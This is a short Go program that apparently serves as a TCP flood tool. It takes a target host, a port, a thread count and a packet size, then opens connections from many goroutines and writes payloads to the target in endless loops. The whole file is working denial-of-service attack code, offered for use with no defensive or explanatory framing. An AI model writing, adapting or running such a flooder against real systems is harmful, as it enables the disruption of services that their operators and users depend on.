package main

import (
    "flag"
    "fmt"
    "log"
    "net"
    "sync"
)

var target struct {
    host       string
    port       int
    threads    int
    packetSize int
}

func tcpFlood() {
    payload := make([]byte, target.packetSize*1024)
    conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target.host, target.port))
    if err != nil {
        fmt.Println("Error:", err)
        return
    }
    defer conn.Close()

    for {
        conn.Write(payload)
    }
}

func main() {
    hostPtr := flag.String("host", "", "TCP target host")
    portPtr := flag.Int("port", 0, "TCP target port")
    threadsPtr := flag.Int("threads", 8, "Number of threads")
    packetSizePtr := flag.Int("ps", 1, "Packet size in KB")

    flag.Parse()

    target.host = *hostPtr
    target.port = *portPtr
    target.threads = *threadsPtr
    target.packetSize = *packetSizePtr

    if target.host == "" || target.port == 0 {
        log.Println("Please provide TCP target host and port using the -host and -port flags.")
        return
    }

    log.Printf("Flooding %s:%d with %d threads using %d KB packets...\n", target.host, target.port, target.threads, target.packetSize)

    var wg sync.WaitGroup
    for i := 0; i < target.threads; i++ {
        wg.Add(1)
        go tcpFlood()
    }

    wg.Wait()
}